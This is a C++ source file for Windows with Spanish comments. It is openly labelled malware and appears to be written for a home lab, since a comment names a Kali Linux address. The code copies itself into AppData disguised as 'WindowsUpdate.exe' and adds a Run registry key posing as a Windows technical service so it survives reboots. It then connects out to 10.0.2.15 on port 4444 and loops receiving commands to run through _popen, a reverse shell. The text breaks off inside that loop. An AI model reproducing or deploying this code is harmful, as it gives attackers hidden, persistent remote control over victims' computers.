#include <iostream>

#include <winsock2.h>

#include <string>

#include <array>

#include <memory>

#include <windows.h> // Necesario para el Registro y la Persistencia



#pragma comment(lib, "ws2_32.lib")



// --- 1. FUNCIÓN DE PERSISTENCIA ---

void instalarPersistencia() {

    char rutaPropia[MAX_PATH];

    // Obtenemos la ruta donde está nuestro .exe ahora mismo

    GetModuleFileNameA(NULL, rutaPropia, MAX_PATH);



    // Definimos dónde queremos escondernos (En AppData como WindowsUpdate.exe)

    std::string rutaDestino = std::string(getenv("APPDATA")) + "\\WindowsUpdate.exe";



    // Nos copiamos a esa ruta de forma silenciosa

    CopyFileA(rutaPropia, rutaDestino.c_str(), FALSE);



    // Creamos la llave en el Registro de Windows para arrancar con el PC

    HKEY hKey;

    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);

    RegSetValueExA(hKey, "ServicioTecnicoWindows", 0, REG_SZ, (BYTE*)rutaDestino.c_str(), rutaDestino.length());

    RegCloseKey(hKey);

}



// --- 2. FUNCIÓN PARA EJECUTAR COMANDOS (RCE) ---

std::string ejecutarComando(const char* cmd) {

    std::array<char, 128> buffer;

    std::string resultado;

    

    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);

    if (!pipe) {

        return "Error al ejecutar el comando.\n";

    }

    

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {

        resultado += buffer.data();

    }

    return resultado;

}



// --- 3. EL CORAZÓN DEL PROGRAMA (Un solo main) ---

int main() {

    // Lo primero que hace el malware al abrirse es instalarse en el sistema

    instalarPersistencia();

    

    // Luego, prepara la conexión de red

    WSADATA wsaData;

    SOCKET sock;

    struct sockaddr_in serv_addr;

    char buffer[4096] = {0};



    WSAStartup(MAKEWORD(2,2), &wsaData);

    sock = socket(AF_INET, SOCK_STREAM, 0);



    serv_addr.sin_family = AF_INET;

    serv_addr.sin_port = htons(4444);

    

    // AQUÍ ESTÁ MI  IP DE KALI LINUX

    serv_addr.sin_addr.s_addr = inet_addr("10.0.2.15"); 



    // Intentamos conectar al servidor

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {

        return -1;

    }



    // Bucle infinito esperando y ejecutando órdenes

    while (true) {

        memset(buffer, 0, 4096);

        int valread = recv(sock, buffer, 4096, 0);
